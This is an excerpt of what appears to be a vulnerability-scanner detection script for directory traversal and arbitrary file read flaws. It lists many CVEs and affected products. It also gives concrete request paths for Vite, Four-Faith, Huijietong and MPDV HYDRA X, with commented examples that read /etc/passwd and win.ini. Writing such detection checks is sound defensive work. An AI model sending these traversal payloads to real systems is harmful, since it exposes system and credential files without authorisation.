...
if(description)
{
  ...
  - CVE-2009-3151: Ultrize TimeSheet

  - CVE-2010-0759, CVE-2010-0760: Joomla! Core Design Scriptegrator plugin

  - CVE-2011-10009: S40 CMS

  - CVE-2014-125125: A10 Networks AX Loadbalancer

  - CVE-2018-14957: CMS ISWEB

  - CVE-2018-25113: Dicoogle PACS Web Server
  ...
  - CVE-2022-26271: 74cmsSE

  - CVE-2023-22047: Oracle PeopleSoft

  - CVE-2023-38879: OS4ED openSIS Classic

  - CVE-2023-49031: Tikit (now Advanced) eMarketing platform

  - CVE-2024-10100: binary-husky/gpt_academic

  - CVE-2024-13991: Huijietong Cloud Video Platform

  - CVE-2024-21136: Oracle Retail Xstore Office

  - CVE-2024-26291, CVE-2024-26293: AVID Nexis Agent

  - CVE-2024-27292: Docassemble

  - CVE-2024-3234: gaizhenbiao/chuanhuchatgpt

  - CVE-2024-34470: HSC Mailinspector

  - CVE-2024-36527: puppeteer-renderer
  ...
  - CVE-2025-10708, CVE-2025-10709, CVE-2025-11336, CVE-2025-11337: Four-Faith Water Conservancy
  Informatization Platform

  - CVE-2025-12055: MPDV Mikrolab GmbH HYDRA X, MIP 2 and FEDRA 2

  - CVE-2025-1743: zyx0814 Pichome

  - CVE-2025-24963: Vitest

  - CVE-2025-27956: WebLaudos

  - CVE-2025-28367: mojoPortal CMS

  - CVE-2025-30208, CVE-2025-31125, CVE-2025-31486, CVE-2025-32395: Vite/Vite.js

  - CVE-2025-3021: e-solutions e-management

  - CVE-2025-31131: YesWiki

  - CVE-2025-34031: Moodle LMS Jmol plugin

  - CVE-2025-34047: Leadsec SSL VPN (formerly Lenovo NetGuard)

  - CVE-2025-34048: D-Link DSL-2730U, DSL-2750U, and DSL-2750E ADSL routers

  - CVE-2025-44137: MapTiler Tileserver-php

  - CVE-2025-46002: simogeo/Filemanager

  - CVE-2025-47423: Personal Weather Station Dashboard

  - CVE-2025-50971: AbanteCart

  - CVE-2025-55526: n8n-workflows

  - CVE-2025-7488: JoeyBling SpringBoot_MyBatisPlus

  - CVE-2025-7625: YiJiuSmile kkFileViewOfficeEdit

  - No CVEs: Sharp Multi-Function Printers, Ncast, UniSharp Laravel File Manager, FastBee, Nsfocus,
  Motic Digital Slide Management System, Symfony profiler (debug mode)
...
cgis = make_list( cgis,
  ...
  # CVE-2025-11336 (https://github.com/rookie1006/CVE/issues/1) -> /stAlarmConfigure/index.do/../../aloneReport/download.do;otherlogout.do?fileName=../../../some/file
  # CVE-2025-11337 (https://github.com/jiangfeng13/CVE/issues/1) -> /aloneReport/index.do/../../aloneReport/download.do;othersusrlogout.do?fileName=../../../some/file
  # nb: All GitHub issues shows that the flaws are unauthenticated and could read arbitrary files
  ...
  "/stAlarmConfigure/index.do/../../aloneReport/download.do;otherlogout.do?fileName=<<file_nd_traversal_replace>>",
  "/aloneReport/index.do/../../aloneReport/download.do;othersusrlogout.do?fileName=<<file_nd_traversal_replace>>",

  # Various for Vite/Vite.js
  # CVE-2025-30208 (https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w) -> /@fs/some/file?import&raw??
  # CVE-2025-31125 (https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8) -> /@fs/some/file?import&?inline=1.wasm?init
  # CVE-2025-31486 (https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x) -> /some/file?.svg?.wasm?init
  # CVE-2025-32395 (https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4) -> /@fs/some/file/#/../../../../../etc/passwd
  "/@fs/<<file_nd_traversal_replace>>?import&raw??",
  "/@fs/<<file_nd_traversal_replace>>?import&?inline=1.wasm?init",
  "/<<file_nd_traversal_replace>>?.svg?.wasm?init",
  "/@fs/test/#/<<file_nd_traversal_replace>>",

  # CVE-2024-13991 (https://www.vulncheck.com/advisories/huijietong-cloud-video-platform-filedownload-arbitrary-file-read)
  "/fileDownload?action=downloadBackupFile&fullPath=<<file_nd_traversal_replace>>",

  # CVE-2025-12055 (https://sec-consult.com/vulnerability-lab/advisory/unauthenticated-local-file-disclosure-in-mpdv-mikrolab-mip-2-fedra-2-hydra-x-manufacturing-execution-system/) -> /hx/resources/public/$SCHEMAS$?Filename=c%3a%5cwindows%5cwin.ini
  "/hx/resources/public/$SCHEMAS$?Filename=<<file_nd_traversal_replace>>"
);
